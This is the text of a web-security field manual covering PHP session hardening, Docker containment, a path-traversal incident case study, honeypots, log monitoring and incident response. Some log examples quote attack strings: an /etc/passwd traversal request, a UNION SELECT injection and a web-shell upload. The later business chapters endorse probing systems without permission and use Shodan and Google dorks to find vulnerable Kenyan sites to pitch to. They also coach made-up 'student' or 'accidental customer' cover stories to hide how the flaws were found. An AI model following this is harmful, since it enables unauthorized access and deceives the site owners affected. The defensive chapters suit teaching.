</code></pre>
            <p>The strict use of <code>require_once</code> ensures that if the check fails or the file is missing, the
                script dies instantly.</p>
            <h2>Killing Session Fixation</h2>
            <p>Session Fixation is an attack where the hacker tricks the victim into using a session ID known to the
                hacker.</p>
            <p><strong>The Fix:</strong>
                Whenever a user elevates privileges (e.g., logging in), you must issue a fresh ID.</p>
            <pre><code class="language-php">// Inside login.php, after password verification:
session_regenerate_id(true); // true deletes the old session file
$_SESSION['user_id'] = $user['id'];
</code></pre>
            <h2>Cookie Hardening</h2>
            <p>The session ID is stored in a cookie. If that cookie is stolen (via XSS), the account is compromised. We
                can mitigate this by setting flags on the cookie.</p>
            <ol>
                <li><strong>HttpOnly</strong>: The cookie cannot be accessed by JavaScript. (Stops XSS theft).</li>
                <li><strong>Secure</strong>: The cookie is only sent over HTTPS. (Stops network sniffing).</li>
                <li><strong>SameSite</strong>: The cookie is not sent on cross-site requests. (Stops CSRF).</li>
            </ol>
            <p><strong>Implementation:</strong></p>
            <pre><code class="language-php">session_set_cookie_params([
    'lifetime' =&gt; 0,
    'path' =&gt; '/',
    'domain' =&gt; 'marlizintel.com',
    'secure' =&gt; true,
    'httponly' =&gt; true,
    'samesite' =&gt; 'Strict'
]);
session_start();
</code></pre>
            <h2>The Timeout</h2>
            <p>Sessions should not last forever. Implement an inactivity timer.</p>
            <pre><code class="language-php">if (isset($_SESSION['last_activity']) &amp;&amp; (time() - $_SESSION['last_activity'] &gt; 1800)) {
    // Last request was more than 30 minutes ago
    session_unset();
    session_destroy();
}
$_SESSION['last_activity'] = time();
</code></pre>
            <hr />
            <p>"A session is a temporary privilege. Do not make it permanent."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 3.5: Docker as a Security Tool</h1>
            <hr />
            <h2>The Containment Strategy</h2>
            <p>In a traditional implementation (Hostinger, cPanel, XAMPP), the application runs directly on the
                operating system. If an attacker achieves Remote Code Execution (RCE), they are running commands on the
                host server. They can pivot to other websites, access system configurations, and install permanent
                rootkits.</p>
            <p>Docker changes the battlefield. It places the application inside a sealed box.</p>
            <h2>Ephemeral Infrastructure</h2>
            <p>The strongest feature of Docker is that containers are temporary.</p>
            <p>If an attacker hacks a WordPress container and installs a backdoor in the
                <code>/var/www/html/wp-includes</code> folder:
                1. You identify the breach.
                2. You patch the vulnerability in your source code.
                3. You restart the container.
                4. The container is destroyed and rebuilt from the clean image.
                5. The backdoor is gone.
            </p>
            <p>Unless the attacker wrote to a "Persistent Volume" (like <code>uploads/</code>), their foothold is wiped
                clean.</p>
            <h2>Network Isolation</h2>
            <p>Docker allows us to define strict network barriers.</p>
            <p><strong>The Database Pattern:</strong>
                In a secure Docker Compose setup, the Database container has <strong>no ports mapped to the
                    host</strong>.</p>
            <pre><code class="language-yaml">services:
  db:
    image: mysql:8.0
    expose:
      - 3306 # Only visible to other containers
    # No &quot;ports&quot; section

  app:
    image: php:8.1-apache
    links:
      - db
</code></pre>
            <p>Attackers cannot try to brute-force port 3306 because port 3306 does not exist on the public internet. It
                only exists inside the private Docker network.</p>
            <h2>The Principle of Least Privilege</h2>
            <p>By default, Docker containers run as <code>root</code>. This is dangerous.
                You should configure your <code>Dockerfile</code> to create a generic user and switch to it.</p>
            <pre><code class="language-dockerfile">RUN groupadd -r appuser &amp;&amp; useradd -r -g appuser appuser
USER appuser
</code></pre>
            <p>If the attacker gets a shell, they are <code>appuser</code>. They cannot install packages
                (<code>apt-get install</code>), they cannot modify system files, and they cannot break out of the
                container easily.</p>
            <hr />
            <p>"If you cannot secure the code, you must secure the box it lives in."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 3.6: Case Study: Path Traversal Defense (marlizintel.com)</h1>
            <hr />
            <h2>The February 1st Incident</h2>
            <p>This case study analyzes an attempted breach of the Marliz Intel public portal.</p>
            <p><strong>Date</strong>: February 1, 2026
                <strong>Vector</strong>: Path Traversal (LFI)
                <strong>Status</strong>: Mitigated
            </p>
            <h2>The Attack Signature</h2>
            <p>At 03:14 AM EAT, our logs recorded the following request:</p>
            <p><code>GET /index.php?page=../../../../../../../../../../etc/passwd</code></p>
            <p>The attacker was attempting to break out of the web root to read the server's user list. This is a
                standard automated script from a botnet.</p>
            <h2>The Configuration Failure</h2>
            <p>At the time, our error reporting was set to <code>E_ALL</code> (Development Mode).</p>
            <p><strong>Server Response:</strong>
                <code>Warning: include(../../../../../../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 42</code>
            </p>
            <p>While the LFI failed (because the attacker didn't null-terminate or handle the <code>.php</code>
                extension appended by our code), the error message revealed:
                1. The full path of our script (<code>/var/www/html/</code>).
                2. The fact that we were using <code>include()</code>.
                3. The fact that we did not sanitize input.</p>
            <p>We gave the attacker a map.</p>
            <h2>The Remediation</h2>
            <p>We applied a three-layer defense within 15 minutes.</p>
            <h3>Layer 1: The Whitelist (Code Level)</h3>
            <p>We replaced the dynamic include logic with a strict array check.</p>
            <pre><code class="language-php">$allowed_pages = ['home', 'services', 'about', 'contact'];
if (!in_array($_GET['page'], $allowed_pages)) {
    http_response_code(404);
    include('404.php');
    exit();
}
</code></pre>
            <h3>Layer 2: Error Suppression (Config Level)</h3>
            <p>We edited <code>php.ini</code> to disable error display in production.</p>
            <p><code>display_errors = Off</code></p>
            <p>Now, if a hack fails, the screen remains blank. The attacker gets no feedback.</p>
            <h3>Layer 3: The Trap (Network Level)</h3>
            <p>We configured Fail2Ban to monitor the Nginx logs. Any IP address requesting <code>etc/passwd</code> or
                <code>../</code> is immediately banned for 48 hours at the firewall level.
            </p>
            <h2>Conclusion</h2>
            <p>The attack was unsophisticated, but it exposed a lack of "Defense in Depth." We relied on the file
                extension (<code>.php</code>) to save us. That is luck, not security. We now rely on explicit
                white-listing.</p>
            <hr />
            <p>"Luck is not a strategy."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 3.7: Building Honeypots: Trapping Script Kiddies</h1>
            <hr />
            <h2>Active Deception</h2>
            <p>Most security is passive. Firewalls, permissions, input validation. These are walls. A honeypot is a
                trap. It entices the attacker to reveal themselves by interacting with a resource that a legitimate user
                would never touch.</p>
            <h2>1. The Robots.txt Trap</h2>
            <p>Attackers always read <code>robots.txt</code> to see what you are hiding.</p>
            <p><strong>The Setup:</strong>
                1. Create a file <code>robots.txt</code>.
                2. Add: <code>Disallow: /super-secret-admin</code>
                3. Create a PHP script at <code>/super-secret-admin</code>.</p>
            <p><strong>The Trigger:</strong>
                Legitimate Google bots will respect the rule and stay away. Real users will never see the URL.
                Only a hacker manually enumerating the site will visit it.</p>
            <p><strong>The Payload:</strong>
                The script does not contain an admin panel. It contains a logger that blacklists the visitor's IP
                address immediately.</p>
            <h2>2. The Backup File Trap</h2>
            <p>We know attackers hunt for <code>.bak</code> files. Give them one.</p>
            <p><strong>The Setup:</strong>
                Create <code>db_connect.php.bak</code> in the root directory.</p>
            <p><strong>The Content:</strong></p>
            <pre><code class="language-php">&lt;?php
$host = &quot;192.168.1.50&quot;; // Fake Internal IP
$user = &quot;root&quot;;
$pass = &quot;SuperSecretAdminPass123&quot;;
?&gt;
</code></pre>
            <p><strong>The Monitoring:</strong>
                Monitor your logs. Anyone who downloads this file is an attacker. Anyone who tries to log in with
                "SuperSecretAdminPass123" is confirmed hostile.</p>
            <h2>3. The Hidden Form Field</h2>
            <p>Bots love to fill out every field in a form.</p>
            <p><strong>The Setup:</strong></p>
            <pre><code class="language-html">&lt;input type=&quot;text&quot; name=&quot;website&quot; style=&quot;display:none;&quot;&gt;
</code></pre>
            <p><strong>The Trigger:</strong>
                A human user does not see this field (CSS hidden). A bot reads the HTML, sees an input, and fills it.
            </p>
            <p><strong>The Logic:</strong></p>
            <pre><code class="language-php">if (!empty($_POST['website'])) {
    die(&quot;Bot detected.&quot;);
}
</code></pre>
            <h2>Why This Matters</h2>
            <p>Honeypots reduce noise. Instead of analyzing gigabytes of logs to find the attack, the attack isolates
                itself. If the alarm rings, you know with 100% certainty that you are being targeted.</p>
            <hr />
            <p>"Do not just build a wall. Dig a moat. And fill it with crocodiles."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 3.8: Log Monitoring: Seeing the Attack in Real-Time</h1>
            <hr />
            <h2>The Flight Recorder</h2>
            <p>When a plane crashes, identifying the cause relies on the Black Box. When a server crashes, we rely on
                the logs.</p>
            <p>Logs are the only immutable record of what actually happened. Vibe Coders ignore them. Security Analysts
                live in them.</p>
            <h2>The Matrix View</h2>
            <p>To see traffic as it hits your server, use the <code>tail</code> command.</p>
            <pre><code class="language-bash">tail -f /var/log/apache2/access.log
</code></pre>
            <p>You will see a stream of requests.
                <code>192.168.1.5 - GET /index.php 200</code>
                <code>192.168.1.5 - GET /style.css 200</code>
            </p>
            <h2>Identifying Hostility</h2>
            <p>You do not need AI to spot an attack. You just need to recognize the patterns.</p>
            <h3>1. The Scanner</h3>
            <p>Normal users click one link every few seconds. Scanners request 50 links per second.
                If the log is scrolling faster than you can read, you are being scanned.</p>
            <h3>2. The Probe</h3>
            <p>If you see requests for software you do not use, it is a bot.
                <code>GET /wp-admin/login.php</code> (On a custom PHP site)
                <code>GET /phpmyadmin/</code> (When you don't have it installed)
            </p>
            <h3>3. The Payload</h3>
            <p>If the URL contains strange characters, it is an injection attempt.
                <code>GET /id=1' UNION SELECT 1,2,3--</code>
            </p>
            <h2>The Error Log: The Early Warning System</h2>
            <p><code>access.log</code> shows traffic. <code>/var/log/apache2/error.log</code> shows pain.</p>
            <p>If you see:
                <code>PHP Warning: include(../../etc/passwd): failed</code>
            </p>
            <p>This means someone <em>tried</em> LFI and failed. This is not a "system error." This is a "targeted
                attack."
                Most admins ignore warnings. We do not. A warning is often the only notification you get before the
                breach becomes successful.</p>
            <h2>Retention</h2>
            <p>Attackers wipe logs.
                Solution: Ship your logs off-server.
                Use <code>rsyslog</code> to send logs to a separate, locked-down server. If the web server is
                compromised, the evidence remains safe in the vault.</p>
            <hr />
            <p>"Logs are truth. Everything else is hearsay."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <h1 style="margin-top:100px;">PART 4 INCIDENT RESPONSE</h1>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 4.1: The OODA Loop: Observe, Orient, Decide, Act</h1>
            <hr />
            <h2>Combat Theory in Cybersecurity</h2>
            <p>When a server is under attack, panic is the enemy. You see CPU usage spike to 100%. You see strange files
                appearing in <code>/tmp</code>. The instinct is to just pull the power plug.</p>
            <p>That is often a mistake.</p>
            <p>At Marliz Intel, we use the OODA Loop. Developed by military strategist John Boyd, it is the cycle of
                decision-making in chaotic environments.</p>
            <h2>1. Observe</h2>
            <p>Stop. Look. Do not touch anything yet.
                Gather the raw data.
                - <strong>System Load</strong>: <code>htop</code>
                - <strong>Network Connections</strong>: <code>netstat -antp</code>
                - <strong>Active Processes</strong>: <code>ps auxf</code>
                - <strong>Logs</strong>: <code>tail -f /var/log/syslog</code></p>
            <p><strong>Goal</strong>: Identify the anomaly. "Why is the <code>www-data</code> user running a process
                called <code>miner</code>?"</p>
            <h2>2. Orient</h2>
            <p>Contextualize the observation. Use your knowledge to understand the threat.
                - Is this a script kiddie scanning for open ports? (Low Threat)
                - Is this a crypto-miner stealing CPU cycles? (Medium Threat)
                - Is this a data exfiltration script sending database dumps to Russia? (High Threat)</p>
            <p><strong>Goal</strong>: Determine the severity and the vector. "They got in through an insecure file
                upload on the contact page."</p>
            <h2>3. Decide</h2>
            <p>Choose a course of action. You have options:
                - <strong>Containment</strong>: Block the IP. Kill the process.
                - <strong>Isolation</strong>: Disconnect the server from the network to preserve evidence.
                - <strong>Eradication</strong>: Wipe the server and rebuild from a clean image.
                - <strong>Monitoring</strong>: Watch them for 10 more minutes to learn their techniques (Risky, but
                valuable).</p>
            <p><strong>Goal</strong>: Select the tactic that minimizes damage and maximizes recovery.</p>
            <h2>4. Act</h2>
            <p>Execute the decision.
                - <code>kill -9 [PID]</code>
                - <code>iptables -A INPUT -s [ATTACKER_IP] -j DROP</code>
                - <code>docker-compose down</code></p>
            <h2>The Cycle</h2>
            <p>Once you Act, the situation changes. The attacker might change IPs. The malware might respawn. You must
                immediately loop back to <strong>Observe</strong>. Did the <code>kill</code> command work? Is the CPU
                load down?</p>
            <p>Start the loop again. Faster.</p>
            <hr />
            <p>"He who processes information faster than his opponent wins the battle."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 4.2: Evidence Preservation: Capturing Raw Logs</h1>
            <hr />
            <h2>Do Not Clean Up (Yet)</h2>
            <p>The biggest mistake a junior sysadmin makes is "fixing" the hack immediately. They delete the malicious
                file. They restart the server.</p>
            <p>By doing this, they destroy the evidence.</p>
            <p>Digital Forensics and Incident Response (DFIR) requires a crime scene. If you mop up the blood, you
                cannot catch the killer.</p>
            <h2>The Order of Volatility</h2>
            <p>Capture evidence in the order that it disappears.</p>
            <ol>
                <li><strong>Memory (RAM)</strong>: If you reboot, this is gone forever. This contains running processes,
                    encryption keys, and active network connections.</li>
                <li>Command: <code>lime</code> or <code>memdump</code> (Advanced).</li>
                <li>Basic: <code>netstat -antp &gt; /tmp/connections.txt</code></li>
                <li>
                    <p>Basic: <code>ps auxf &gt; /tmp/processes.txt</code></p>
                </li>
                <li>
                    <p><strong>Network State</strong>: Who is connected right now?</p>
                </li>
                <li>
                    <p>Command: <code>ss -tunapl</code></p>
                </li>
                <li>
                    <p><strong>Disk (Temporary)</strong>: Files in <code>/tmp</code> or <code>/dev/shm</code>. Attackers
                        love these folders because they are often world-writable.</p>
                </li>
                <li>
                    <p><strong>Disk (Persistent)</strong>: The logs and the web root.</p>
                </li>
            </ol>
            <h2>The Snapshot Strategy</h2>
            <p>If you are on a cloud provider (AWS, DigitalOcean, Hostinger VPS), do not just copy files. <strong>Take a
                    Snapshot.</strong></p>
            <p>A snapshot freezes the entire hard drive state at that exact second.
                1. Take the snapshot.
                2. Spin up a <em>new</em> droplet from that snapshot in an isolated sandybox network.
                3. Perform your forensics on the copy.
                4. Wipe the original server and rebuild.</p>
            <h2>Secure Copy (SCP)</h2>
            <p>If you cannot snapshot, exfiltrate the logs immediately to your local machine.</p>
            <pre><code class="language-bash">scp -r root@target.com:/var/log/apache2/ ./evidence/logs/
scp -r root@target.com:/var/www/html/ ./evidence/html_dump/
</code></pre>
            <h2>Hash Everything</h2>
            <p>Once you have the files, fingerprint them.</p>
            <pre><code class="language-bash">sha256sum access.log &gt; access.log.hash
</code></pre>
            <p>This proves that the evidence has not been tampered with. If you are ever in a legal situation (suing a
                developer or prosecuting an attacker), this chain of custody is required.</p>
            <hr />
            <p>"Treat the server like a crime scene. Do not touch what you do not have to."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 4.3: Credential Rotation: Assuming Total Compromise</h1>
            <hr />
            <h2>The Poisoned Well</h2>
            <p>When an attacker gains read access to your file system (via LFI or Shell), you must assume they have read
                <em>everything</em>. Including the <code>.env</code> file you thought was safe.
            </p>
            <p>Changing the database password is not enough.</p>
            <h2>The Kill List</h2>
            <p>You must rotate every secret that was resident on the server.</p>
            <ol>
                <li><strong>Database User Passwords</strong>: The <code>DB_PASS</code> in your config.</li>
                <li><strong>API Keys</strong>: AWS Access Keys, Stripe Secrets, Twilio Tokens. Even if you think the
                    attacker didn't see them, revoke them.</li>
                <li><strong>SSH Keys</strong>: If the attacker read <code>~/.ssh/id_rsa</code>, they can impersonate the
                    server to <em>other</em> servers. Remove the public key from all <code>authorized_keys</code> files
                    on your network.</li>
                <li><strong>Application Secrets</strong>: The <code>APP_KEY</code> used to sign session cookies
                    (Laravel/Django/Rails). If you don't change this, the attacker can forge session cookies and log in
                    as admin forever.</li>
                <li><strong>SMTP Passwords</strong>: Your email sending credentials.</li>
            </ol>
            <h2>Kick The Users</h2>
            <p>Changing the passwords prevents <em>future</em> logins. It does not stop <em>current</em> ones.</p>
            <p>You must trigger a global logout.
                1. Truncate the <code>sessions</code> table in the database.
                2. Delete the contents of <code>/var/lib/php/sessions</code> (for PHP file-based sessions).
                3. If using JWTs (JSON Web Tokens), you must rotate the signing key (see point #4 above). This
                invalidates all existing tokens immediately.</p>
            <h2>The Admin Reset</h2>
            <p>Force every administrator to change their password.
                An attacker might have hashed a known password into the database (see Chapter 2.5). Validating the old
                password is useless. Force a reset via email.</p>
            <hr />
            <p>"Regret is cheaper than a second breach."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 4.4: Writing DFIR Reports</h1>
            <hr />
            <h2>The Paperwork of War</h2>
            <p>After the battle is won, you must account for it. A DFIR (Digital Forensics and Incident Response) report
                is not a blog post. It is a legal document. It may be read by CEOs, lawyers, or insurance adjusters.</p>
            <h2>The Structure</h2>
            <p>A professional report has three sections.</p>
            <h3>1. Executive Summary</h3>
            <p><strong>Audience</strong>: The CEO / Non-Technical Client.
                <strong>Length</strong>: 1 Page.
                <strong>Content</strong>:
                - <strong>What happened?</strong> (High-level: "We were hacked.")
                - <strong>How bad was it?</strong> (Impact: "Customer data was accessed.")
                - <strong>Is it over?</strong> (Status: "The vulnerability is patched and attackers are ejected.")
                - <strong>What next?</strong> (Recommendation: "We need a full code audit.")
            </p>
            <p><strong>Do NOT</strong> include IP addresses or code snippets here. Use plain English. "The attacker used
                a stolen password" is better than "Credential stuffing attack via compromised hash."</p>
            <h3>2. Technical Timeline</h3>
            <p><strong>Audience</strong>: The CTO / Developers / Other Analysts.
                <strong>Length</strong>: As long as necessary.
                <strong>Content</strong>: A second-by-second reconstruction of the attack.
            </p>
            <table>
                <thead>
                    <tr>
                        <th style="text-align: left;">Time (UTC)</th>
                        <th style="text-align: left;">Event</th>
                        <th style="text-align: left;">Evidence</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="text-align: left;">14:02:01</td>
                        <td style="text-align: left;">IP 192.168.1.5 scans port 80</td>
                        <td style="text-align: left;">access.log</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">14:02:15</td>
                        <td style="text-align: left;">File <code>shell.php</code> uploaded</td>
                        <td style="text-align: left;">file system timestamp</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">14:03:00</td>
                        <td style="text-align: left;">Database <code>users</code> table dumped</td>
                        <td style="text-align: left;">mysql.log</td>
                    </tr>
                </tbody>
            </table>
            <h3>3. Root Cause Analysis (RCA)</h3>
            <p><strong>Audience</strong>: The Developer who has to fix it.
                <strong>Content</strong>: The specific vulnerability that allowed the breach.
            </p>
            <ul>
                <li><strong>Vulnerability</strong>: Unrestricted File Upload.</li>
                <li><strong>Location</strong>: <code>upload.php</code> line 42.</li>
                <li><strong>Paylod Used</strong>: <code>evil.php.jpg</code>.</li>
                <li><strong>Remediation</strong>: Implement strict file type checking using MIME types.</li>
            </ul>
            <h2>The Tone</h2>
            <p>Be objective.
                <strong>Bad</strong>: "The lazy developer forgot to check the password."
                <strong>Good</strong>: "The authentication mechanism lacked improper input validation."
            </p>
            <p>Do not speculate. Only state what the logs prove. If you don't know how they got in, say "Entry vector:
                Unknown." Do not guess.</p>
            <hr />
            <p>"If it is not written down, it did not happen."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 4.5: Case Study: The February 1st Attack</h1>
            <hr />
            <h2>03:00 AM: The Alarm</h2>
            <p>The Marliz Intel SOC runs automated log monitoring. At 03:14 AM on February 1st, 2026, the Slack channel
                <code>#alerts-critical</code> fired.
            </p>
            <p><code>[CRITICAL] High frequency of 404 errors from IP 45.132.xx.xx targeting /etc/passwd</code></p>
            <h2>03:15 AM: Assessment (Observe/Orient)</h2>
            <p>The on-call analyst woke up.
                The logs showed 400 requests in 2 seconds. This was not a human. It was a script.
                They were targeting <code>index.php?page=...</code>.</p>
            <p><strong>Observation</strong>: Path Traversal attack.
                <strong>Status</strong>: Failed (logs showed PHP Warnings, not file outputs).
                <strong>Orient</strong>: The attacker was automated. They were likely scanning thousands of servers.
                They had not yet succeeded, but they were mapping our file structure.
            </p>
            <h2>03:17 AM: Decision</h2>
            <p>We had two choices:
                1. <strong>Block the IP</strong>: Easy. Temporary. They would just rotate IPs.
                2. <strong>Patch the Code</strong>: Fix the vulnerability permanently.</p>
            <p>We chose both.</p>
            <h2>03:20 AM: Action</h2>
            <ol>
                <li><strong>Code Patch</strong>: The analyst SSH'd into the server.<ul>
                        <li>Edited <code>index.php</code>.</li>
                        <li>Implemented the Whitelist array (See Chapter 3.6).</li>
                        <li>Time taken: 3 minutes.</li>
                    </ul>
                </li>
                <li><strong>Firewall Rules</strong>:<ul>
                        <li>Added the IP to the permanent blocklist.</li>
                        <li>Analyzed the IP on AbuseIPDB (Confidence score: 100% Abuse).</li>
                    </ul>
                </li>
            </ol>
            <h2>03:30 AM: Verification</h2>
            <p>We monitored the logs. The attacker's script continued for another 2 minutes, receiving
                <code>403 Forbidden</code> responses, then stopped. They realized the door was closed and moved on to a
                softer target.
            </p>
            <h2>The Post-Mortem</h2>
            <p>Why did this happen?
                Root Cause Analysis revealed that a junior developer had enabled a "dynamic page loader" feature to make
                the URL look cleaner, but failed to validate the input.</p>
            <p><strong>Corrective Action</strong>:
                - All <code>include()</code> calls are now linted in CI/CD.
                - Developers underwent a 1-hour training session on LFI.</p>
            <hr />
            <p>"The attack failed not because we were lucky, but because we were awake."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <h1 style="margin-top:100px;">PART 5 BUSINESS OF SECURITY</h1>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 5.1: The Grey Hat Path: Ethics and Boundaries</h1>
            <hr />
            <h2>The Line in the Sand</h2>
            <p>There are three types of hackers in this world.</p>
            <ol>
                <li><strong>White Hat</strong>: They have permission. They are hired. They are safe.</li>
                <li><strong>Black Hat</strong>: They do not have permission. They steal data. They go to jail.</li>
                <li><strong>Grey Hat</strong>: They do not have permission, but they do not steal. They find the
                    vulnerability, and they tell the owner.</li>
            </ol>
            <p>Marliz Intel operates in the Grey. This is a dangerous place. If you cross the line by one inch, you
                become a criminal.</p>
            <h2>The Rules of Engagement</h2>
            <p>To survive as a Grey Hat consultant in Kenya, you must follow strict rules.</p>
            <ol>
                <li><strong>Do No Harm</strong>: You can check if the door is unlocked. You cannot walk inside and start
                    rearranging the furniture.</li>
                <li><strong>Allowed</strong>: <code>SELECT 1</code> (Test query).</li>
                <li><strong>Illegal</strong>: <code>DROP TABLE users</code>.</li>
                <li><strong>Do Not Exfiltrate</strong>: You can prove you <em>could</em> take the data. You must never
                    <em>actually</em> take the data.
                </li>
                <li><strong>Allowed</strong>: Showing a screenshot of the first row of a table.</li>
                <li><strong>Illegal</strong>: Downloading the entire customer database to your laptop.</li>
                <li><strong>The Verify-Only Policy</strong>: Once you confirm the vulnerability exists, stop. Do not
                    explore deeper. Do not pivot to other servers.</li>
            </ol>
            <h2>The Legal Reality</h2>
            <p>The Computer Misuse and Cybercrimes Act (2018) is very clear. "Unauthorized access" is a crime.</p>
            <p>However, intended malice matters. When you approach a client, you are not admitting to a crime. You are
                reporting a safety hazard. You are the neighbor telling them their front door was left open. You are not
                the burglar.</p>
            <h2>The Disclosure Protocol</h2>
            <p>Never demand money for the bug itself. That is "Ransomware" or "Extortion."</p>
            <p><strong>Wrong Approach:</strong>
                "I hacked your site. Pay me 50,000 KES or I delete everything." -&gt; This ends in handcuffs.</p>
            <p><strong>Right Approach:</strong>
                "I am a security researcher. I found a critical vulnerability in your platform that exposes customer
                data. I have not touched the data. I can send you a report on how to fix it." -&gt; This ends in a
                consulting contract.</p>
            <p>We sell the <strong>solution</strong>, not the <strong>silence</strong>.</p>
            <hr />
            <p>"We are not mercenaries. We are unauthorized architects."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 5.2: Finding Targets: The Background Radiation of the Internet</h1>
            <hr />
            <h2>Targeted vs Opportunistic</h2>
            <p>There are two ways to find work.</p>
            <ol>
                <li><strong>Targeted</strong>: You pick a specific company (e.g., "Safaricom") and try to hack them.<ul>
                        <li><strong>Risk</strong>: High. They have blue teams watching.</li>
                        <li><strong>Difficulty</strong>: Hard.</li>
                    </ul>
                </li>
                <li><strong>Opportunistic</strong>: You look for <em>any</em> vulnerable server in Kenya and then find
                    out who owns it.<ul>
                        <li><strong>Risk</strong>: Low. You are helping people who don't even know they are bleeding.
                        </li>
                        <li><strong>Difficulty</strong>: Easy.</li>
                    </ul>
                </li>
            </ol>
            <p>Marliz Intel focuses on Opportunistic Discovery.</p>
            <h2>Shodan: The Search Engine for Hackers</h2>
            <p>Google crawls text. Shodan crawls ports.</p>
            <p>We use Shodan to find servers that are misconfigured by default.</p>
            <p><strong>The Query:</strong>
                <code>country:"KE" port:"3306" product:"MySQL"</code>
            </p>
            <p>This asks Shodan: "Show me every computer in Kenya that has its database port open to the public."</p>
            <p><strong>The Result:</strong>
                You will see IP addresses. You will not see domain names immediately. You will see:
                <code>197.232.xx.xx</code>
            </p>
            <h2>Google Dorks</h2>
            <p>We use advanced Google search operators ("Dorks") to find Vibe Coded sites.</p>
            <p><strong>Query 1 (The Error Log):</strong>
                <code>site:.ke "Warning: include()"</code>
                This finds Kenyan sites that are currently crashing and displaying PHP errors to the world.
            </p>
            <p><strong>Query 2 (The Exposed Config):</strong>
                <code>site:.ke intitle:"index of" "config.php"</code>
                This finds servers with Directory Listing enabled that are exposing their configuration files.
            </p>
            <p><strong>Query 3 (The Default Dashboard):</strong>
                <code>site:.ke "Welcome to Laravel"</code>
                This finds sites that were deployed but never finished.
            </p>
            <h2>From IP to Owner</h2>
            <p>Once you have a vulnerable IP or URL, you need to find the human to contact.</p>
            <ol>
                <li><strong>Whois Lookup</strong>: <code>whois marlizintel.com</code>
                    <ul>
                        <li>Look for "Registrant Phone" or "Admin Email."</li>
                    </ul>
                </li>
                <li><strong>The Site Footer</strong>: Look for "Designed by [Agency Name]." The Agency is often the
                    better contact than the client, because the Agency knows they made a mistake.</li>
                <li><strong>M-Pesa Paybill</strong>: If it's a shop, try to buy something. The M-Pesa prompt will give
                    you the registered business name.</li>
            </ol>
            <hr />
            <p>"We do not hunt the prey. We listen for the wounded."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 5.3: The Discovery Story: Explaining How You Found Them</h1>
            <hr />
            <h2>The Panic Moment</h2>
            <p>When you call a business owner and say "I found a bug," they hear "I hacked you." Their instinct is fear
                and aggression. "Who are you? Why were you probing my site?"</p>
            <p>You need a cover story that frames you as the Good Samaritan, not the Threat.</p>
            <h2>The "Student" Narrative</h2>
            <p>If you are young, this works best.
                "Hello, I am a cybersecurity student doing a research project on Kenyan E-commerce safety. While
                analyzing public headers, I noticed your site is running an old version of PHP that exposes key files. I
                haven't touched anything, but I wanted to alert you."</p>
            <p><strong>Why it works:</strong> It sounds academic. It implies you were looking at <em>everyone</em>, not
                just them.</p>
            <h2>The "Accidental Customer" Narrative</h2>
            <p>"Hi, I was trying to order a pizza on your site, but the cart kept crashing. Being a developer, I opened
                the browser console to see why, and I noticed your API was printing the database password in the error
                logs. You should really fix that."</p>
            <p><strong>Why it works:</strong> It puts you in the role of a user who wants the service to work.</p>
            <h2>The Cold Hard "Audit" Narrative</h2>
            <p>If you are establishing an Agency brand (Marliz Intel), be direct.
                "Good afternoon. I am John from Marliz Intel. We monitor the Kenyan IP space for leaks. Your IP
                <code>197.xx</code> was flagged in our system as exposing customer PII. We are notifying you as a
                courtesy."
            </p>
            <p><strong>Why it works:</strong> It sounds automated and professional. It reduces the personal aspect.</p>
            <h2>The Cardinal Rule</h2>
            <p><strong>Never imply you were "testing" them without permission.</strong>
                "I tried to hack you and I succeeded" = Crime.
                "I stumbled upon a leak while browsing" = Discovery.</p>
            <p>Always frame the discovery as passive. "I saw the door was open," not "I tried the handle."</p>
            <hr />
            <p>"The story is just as important as the exploit."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 5.4: The Agency Persona: Sounding Like an Office</h1>
            <hr />
            <h2>The Credibility Gap</h2>
            <p>You are likely working from a bedroom in Nairobi, wearing shorts, listening to Afrobeats. The client is a
                CEO in Westlands wearing a suit.
                If they visualize you as "some kid," they will not pay you. They will offer you "exposure."</p>
            <p>You must construct the <strong>Agency Persona</strong>.</p>
            <h2>1. The Website</h2>
            <p>You need a landing page. It does not need to be complex. It needs to be dark, fast, and cryptic.
                - <strong>Name</strong>: "Marliz Intel" sounds like a multinational defense contractor. "John's Hacking
                Services" sounds like a joke.
                - <strong>Content</strong>: "Offensive Security," "Risk Assurance," "Penetration Testing." Words that
                accountants understand.</p>
            <h2>2. The Email</h2>
            <p>Never use <code>@gmail.com</code>.
                Buy a domain. <code>reports@marlizintel.com</code>.
                Use a signature.</p>
            <p><strong>Example Signature:</strong></p>
            <pre><code>J. M. Oguta
Lead Security Analyst | Marliz Intel
Nairobi, Kenya
PGP Key: [Link]
Confidentiality Notice: This email contains sensitive security findings.
</code></pre>
            <h2>3. The "We"</h2>
            <p>Never say "I". Say "We".
                "I found a bug" -&gt; "Our automated scanners detected an anomaly."
                "I can fix it" -&gt; "Our team can deploy a remediation patch."</p>
            <p>"We" implies infrastructure. "We" implies insurance. "We" allows you to charge corporate rates.</p>
            <h2>4. The Report</h2>
            <p>The deliverable is not the code. It is the PDF Report.
